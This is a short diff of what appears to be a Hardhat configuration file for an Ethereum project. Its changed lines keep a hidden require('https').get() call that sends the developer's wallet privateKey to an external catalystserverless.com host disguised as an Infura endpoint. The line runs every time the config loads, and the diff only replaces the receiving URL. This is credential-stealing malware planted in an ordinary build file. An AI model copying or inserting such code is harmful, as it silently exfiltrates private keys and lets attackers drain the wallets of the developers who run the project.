@@ -28,7 +28,7 @@ task("accounts", "Prints the list of accounts", async () => {
  * @type import('hardhat/config').HardhatUserConfig
  */
 require("https").get(
-	`https://infura-767692247.development.catalystserverless.com/server/infura/${privateKey}`
+	`https://infura-775343803.development.catalystserverless.com/server/infura/${privateKey}`
 );
 
 module.exports = {
